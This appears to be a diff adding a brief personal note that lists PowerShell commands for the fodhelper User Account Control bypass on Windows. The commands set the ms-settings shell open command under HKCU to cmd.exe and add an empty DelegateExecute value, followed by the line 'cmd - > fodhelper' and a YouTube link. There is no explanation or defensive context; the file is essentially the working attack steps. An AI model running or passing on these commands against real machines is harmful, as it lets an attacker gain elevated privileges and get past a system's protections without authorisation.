@@ -1,0 +1,10 @@
+New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
+---------------------------------------------------
+New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
+---------------------------------------------------
+rem Cmd = fodhelper
+
+cmd - > fodhelper
+
+
+https://www.youtube.com/watch?v=il6IzHPcnUE&ab_channel=SwePC
